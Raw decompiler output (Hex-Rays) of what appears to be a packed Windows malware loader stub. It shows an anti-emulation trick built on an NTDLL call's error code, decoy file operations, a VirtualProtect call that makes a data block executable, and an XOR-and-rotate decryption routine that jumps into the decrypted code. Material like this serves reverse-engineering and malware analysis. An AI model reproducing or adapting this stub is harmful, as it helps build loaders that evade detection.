/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// DWORD __stdcall GetFileType(HANDLE hFile);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall GetLastError();
// HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
_DWORD *__stdcall sub_412FDD(_DWORD *, unsigned int, int);
int start();

//-------------------------------------------------------------------------
// Data declarations

int dword_401000[9] =
{
  -1266696037,
  -235588010,
  1447358689,
  991692426,
  1857817616,
  2055711069,
  1418582659,
  -370629978,
  1492515562
}; // weak
_UNKNOWN loc_401026; // weak
_UNKNOWN loc_413114; // weak
CHAR aFYps[] = "f.yps"; // idb
WCHAR aMlsof8bxn6jvzs[] = L"\u6C4D\u4F73\u3866\u5842\u364E\u566A\u537A\u6348\u526B\u4468\u5966\u2E49\u34675"; // idb
CHAR ProcName[] = "ZwCreateEventPair"; // idb
WCHAR a1xh5jwplvfqjvt[] = L"\u5831\u3568\u574A\u6C50\u6656\u4A51\u7476\u4750\u2E6B\u6E7A2"; // idb
WCHAR aSjhlrcwkdarsfj[] = L"\u4A73\u6C48\u6372\u4B57\u6144\u5352\u6A66\u2E7A\u7955u"; // idb
WCHAR aIpjnrl2q8we2r1[] = L"\u5069\u4E4A\u6C72\u5132\u5738\u3265\u3152\u7275\u5350\u3567\u4F6E\u632E\u576F"; // idb
WCHAR FileName[] = L"\u5451\u6A35\u5335\u596E\u414B\u4662\u644A\u722E\u5272"; // idb
CHAR aSve0hvopkp3t6g[] = "SVE0HVOpkp3t6gZ5TXtsDPF.gr9"; // idb
CHAR ModuleName[] = "NTDLL.DLL"; // idb


//----- (00412FDD) --------------------------------------------------------
_DWORD *__stdcall sub_412FDD(_DWORD *a1, unsigned int a2, int a3)
{
  _DWORD *result; // eax
  unsigned int v4; // ecx

  result = a1;
  v4 = a2 >> 2;
  do
  {
    *result -= a3;
    *result += a3;
    *result ^= 0xFC28D35E;
    *result += a3;
    *result -= 1828519193;
    *result += a3;
    *result = __ROL4__(*result, 11);
    ++result;
    --v4;
  }
  while ( v4 );
  return result;
}

//----- (00413018) --------------------------------------------------------
int start()
{
  DWORD v1; // [esp-20h] [ebp-50h]
  DWORD v2; // [esp-1Ch] [ebp-4Ch]
  struct _SECURITY_ATTRIBUTES *v3; // [esp-18h] [ebp-48h]
  DWORD v4; // [esp-14h] [ebp-44h]
  DWORD v5; // [esp-10h] [ebp-40h]
  HMODULE v6; // [esp-8h] [ebp-38h]
  const CHAR *v7; // [esp-4h] [ebp-34h]
  HANDLE FileA; // [esp+0h] [ebp-30h]
  HANDLE hFile; // [esp+4h] [ebp-2Ch]
  int v10; // [esp+Ch] [ebp-24h]
  int (*ProcAddress)(void); // [esp+1Ch] [ebp-14h]
  HANDLE FileW; // [esp+20h] [ebp-10h]
  DWORD flOldProtect[2]; // [esp+24h] [ebp-Ch] BYREF
  HMODULE hModule; // [esp+2Ch] [ebp-4h]

  hModule = GetModuleHandleA(ModuleName);
  GetCommandLineA();
  v7 = ProcName;
  v6 = hModule;
  v5 = 390;
  v4 = 3;
  v3 = 0;
  v2 = 0;
  v1 = -1610612736;
LABEL_2:
  hFile = CreateFileW(FileName, v1, v2, v3, v4, v5, 0);
  ProcAddress = GetProcAddress(v6, v7);
  GetCommandLineA();
  v7 = 0;
  GetFileType(hFile);
  v6 = 0;
  GetFileType(hFile);
  do
  {
    FileA = CreateFileA(aFYps, 0x40000000u, 0, 0, 3u, 0x101u, 0);
    v10 = ProcAddress();
    GetLastError();
    GetFileType(hFile);
    GetFileSize(FileA, 0);
    ((void (*)(void))((char *)&loc_413114 + (v10 ^ 0xC0000005)))();
    GetFileType(hFile);
    if ( CreateFileW(a1xh5jwplvfqjvt, 0xC0000000, 4u, 0, 3u, 0xA0u, 0) != (HANDLE)-1 )
      goto LABEL_2;
    GetFileSize((HANDLE)0xFFFFFFFF, 0);
    CreateFileA(aSve0hvopkp3t6g, 0x40000000u, 6u, 0, 3u, 0x20u, 0);
  }
  while ( CreateFileW(aSjhlrcwkdarsfj, 0x40000000u, 0, 0, 3u, 0x103u, 0) != (HANDLE)-1 );
  CloseHandle((HANDLE)0xFFFFFFFF);
  VirtualProtect(dword_401000, 0x11D22u, 0x40u, flOldProtect);
  FileW = CreateFileW(aMlsof8bxn6jvzs, 0xE0000000, 2u, 0, 3u, 0xA0u, 0);
  GetFileType(hFile);
  GetFileType(FileW);
  GetFileType(hFile);
  GetFileType(FileW);
  flOldProtect[1] = (DWORD)CreateFileW(aIpjnrl2q8we2r1, 0x60000000u, 7u, 0, 3u, 0x107u, 0);
  GetLastError();
  GetFileSize(FileA, 0);
  ((void (__cdecl *)(int *, int, int, _DWORD, _DWORD, _DWORD))((char *)sub_412FDD + v10 + 1073741819))(
    dword_401000,
    72994,
    v10,
    0,
    0,
    0);
  return ((int (*)(void))loc_401026)();
}
// 41305B: variable 'v1' is possibly undefined
// 41305B: variable 'v2' is possibly undefined
// 41305B: variable 'v3' is possibly undefined
// 41305B: variable 'v4' is possibly undefined
// 41305B: variable 'v5' is possibly undefined
// 401000: using guessed type int dword_401000[9];

// nfuncs=12 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
